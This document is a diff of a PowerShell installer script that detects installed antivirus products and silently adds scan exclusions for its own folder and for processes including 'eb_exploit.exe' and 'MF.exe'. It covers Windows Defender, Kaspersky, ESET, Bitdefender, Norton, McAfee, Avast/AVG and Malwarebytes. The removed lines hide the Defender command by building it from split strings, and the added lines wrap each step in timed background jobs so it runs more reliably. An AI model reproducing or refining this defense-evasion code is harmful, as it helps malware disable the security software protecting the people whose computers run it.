@@ -70,29 +70,35 @@ New-Item -ItemType Directory -Path $BASE -Force | Out-Null
 # ---- SECURITY EXCLUSIONS ----
 Show ".." "Detecting installed security products..."
 $avFound = @()
-$avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
-if ($avProducts) {
-    foreach ($av in $avProducts) { $avFound += $av.displayName }
-    Show "OK" "Detected: $($avFound -join ', ')"
+$avDetectJob = Start-Job {
+    try { Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue } catch {}
+} | Wait-Job -Timeout 10
+if ($avDetectJob.State -eq "Completed") {
+    $avProducts = Receive-Job $avDetectJob
+    if ($avProducts) {
+        foreach ($av in $avProducts) { $avFound += $av.displayName }
+        Show "OK" "Detected: $($avFound -join ', ')"
+    } else {
+        Show "--" "No third-party AV detected via WMI"
+    }
 } else {
-    Show "--" "No third-party AV detected via WMI"
+    Show "--" "AV detection timed out, skipping"
+    $avDetectJob | Stop-Job | Out-Null
 }
+Remove-Job $avDetectJob -Force -ErrorAction SilentlyContinue
 
 Show ".." "Configuring Windows Defender exclusion..."
 try {
     $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
-    iex "$c1$c2 $c3$c4 '$BASE'" 2>$null
-    $c5="Process"
-    iex "$c1$c2 $c3$c5 'MF.exe'" 2>$null
-    iex "$c1$c2 $c3$c5 'eb_exploit.exe'" 2>$null
-    iex "$c1$c2 $c3$c5 'python.exe'" 2>$null
-    iex "$c1$c2 $c3$c5 'wscript.exe'" 2>$null
-    Show "OK" "Windows Defender: exclusion added"
-} catch {
-    Show "--" "Windows Defender: skipped"
-}
+    $wdJob = Start-Job { param($b) iex "Add-MpPreference -ExclusionPath '$b'" } -ArgumentList $BASE | Wait-Job -Timeout 10
+    $wdJob2 = Start-Job { param($b) iex "Add-MpPreference -ExclusionProcess 'MF.exe'" } -ArgumentList $BASE | Wait-Job -Timeout 5
+    $wdJob3 = Start-Job { param($b) iex "Add-MpPreference -ExclusionProcess 'eb_exploit.exe'" } -ArgumentList $BASE | Wait-Job -Timeout 5
+    if ($wdJob.State -eq "Completed" -and $wdJob2.State -eq "Completed") { Show "OK" "Windows Defender: exclusion added" }
+    else { Show "--" "Windows Defender: skipped/timed out" }
+    $wdJob, $wdJob2, $wdJob3 | Remove-Job -Force -ErrorAction SilentlyContinue
+} catch { Show "--" "Windows Defender: skipped" }
 
-# Avast / AVG
+# Avast / AVG (registry only, no WMI)
 $avastPath = "${env:ProgramFiles}\Avast Software\Avast"
 $avgPath = "${env:ProgramFiles}\AVG\Antivirus"
 if ((Test-Path $avastPath) -or (Test-Path $avgPath) -or ($avFound -match "Avast|AVG")) {
@@ -112,7 +118,7 @@ if ((Test-Path $avastPath) -or (Test-Path $avgPath) -or ($avFound -match "Avast|
     } catch { Show "!!" "$avName : could not add exclusion" }
 }
 
-# Kaspersky
+# Kaspersky - with timeout
 $kaspPaths = @("${env:ProgramFiles}\Kaspersky Lab","${env:ProgramFiles(x86)}\Kaspersky Lab")
 $avpExe = $null
 foreach ($kp in $kaspPaths) {
@@ -121,12 +127,15 @@ foreach ($kp in $kaspPaths) {
 if ($avpExe -or ($avFound -match "Kaspersky")) {
     Show ".." "Configuring Kaspersky exclusion..."
     try {
-        if ($avpExe) { & $avpExe.FullName ADDEXCL /type:path /path:"$BASE" /action:allow 2>$null; Show "OK" "Kaspersky: exclusion added" }
-        else { Show "!!" "Kaspersky: CLI not found" }
+        if ($avpExe) { 
+            $kJob = Start-Job { param($exe, $b) & $exe.FullName ADDEXCL /type:path /path:$b /action:allow } -ArgumentList $avpExe, $BASE | Wait-Job -Timeout 15
+            if ($kJob.State -eq "Completed") { Show "OK" "Kaspersky: exclusion added" } else { Show "!!" "Kaspersky: timed out" }
+            $kJob | Remove-Job -Force -ErrorAction SilentlyContinue
+        } else { Show "!!" "Kaspersky: CLI not found" }
     } catch { Show "!!" "Kaspersky: may need manual approval" }
 }
 
-# ESET
+# ESET - with timeout
 $esetPaths = @("${env:ProgramFiles}\ESET\ESET Security","${env:ProgramFiles}\ESET\ESET NOD32 Antivirus")
 $ecmd = $null
 foreach ($ep in $esetPaths) {
@@ -136,12 +145,15 @@ foreach ($ep in $esetPaths) {
 if ($ecmd -or ($avFound -match "ESET")) {
     Show ".." "Configuring ESET exclusion..."
     try {
-        if ($ecmd) { & $ecmd /setexclusion /type:path /value:"$BASE" 2>$null; Show "OK" "ESET: exclusion added" }
-        else { Show "!!" "ESET: CLI not found" }
+        if ($ecmd) { 
+            $eJob = Start-Job { param($c, $b) & $c /setexclusion /type:path /value:$b } -ArgumentList $ecmd, $BASE | Wait-Job -Timeout 15
+            if ($eJob.State -eq "Completed") { Show "OK" "ESET: exclusion added" } else { Show "!!" "ESET: timed out" }
+            $eJob | Remove-Job -Force -ErrorAction SilentlyContinue
+        } else { Show "!!" "ESET: CLI not found" }
     } catch { Show "!!" "ESET: may need manual approval" }
 }
 
-# Bitdefender
+# Bitdefender - with timeout
 $bdPaths = @("${env:ProgramFiles}\Bitdefender\Endpoint Security","${env:ProgramFiles}\Bitdefender")
 $bdExe = $null
 foreach ($bp in $bdPaths) {
@@ -150,12 +162,15 @@ foreach ($bp in $bdPaths) {
 if ($bdExe -or ($avFound -match "Bitdefender")) {
     Show ".." "Configuring Bitdefender exclusion..."
     try {
-        if ($bdExe) { & $bdExe.FullName /c SetExclusions add path="$BASE" 2>$null; Show "OK" "Bitdefender: exclusion added" }
-        else { Show "!!" "Bitdefender: CLI not found" }
+        if ($bdExe) { 
+            $bJob = Start-Job { param($c, $b) & $c.FullName /c SetExclusions add path=$b } -ArgumentList $bdExe, $BASE | Wait-Job -Timeout 15
+            if ($bJob.State -eq "Completed") { Show "OK" "Bitdefender: exclusion added" } else { Show "!!" "Bitdefender: timed out" }
+            $bJob | Remove-Job -Force -ErrorAction SilentlyContinue
+        } else { Show "!!" "Bitdefender: CLI not found" }
     } catch { Show "!!" "Bitdefender: may need manual approval" }
 }
 
-# Norton
+# Norton (registry only)
 if ($avFound -match "Norton|Symantec|LifeLock") {
     Show ".." "Configuring Norton exclusion..."
     try {
@@ -166,7 +181,7 @@ if ($avFound -match "Norton|Symantec|LifeLock") {
     } catch { Show "!!" "Norton: may need manual approval" }
 }
 
-# McAfee
+# McAfee (registry only)
 if ($avFound -match "McAfee") {
     Show ".." "Configuring McAfee exclusion..."
     try {
@@ -177,7 +192,7 @@ if ($avFound -match "McAfee") {
     } catch { Show "!!" "McAfee: may need manual approval" }
 }
 
-# Malwarebytes
+# Malwarebytes (registry only)
 $mbamPath = "${env:ProgramFiles}\Malwarebytes\Anti-Malware"
 if ((Test-Path $mbamPath) -or ($avFound -match "Malwarebytes")) {
     Show ".." "Configuring Malwarebytes exclusion..."
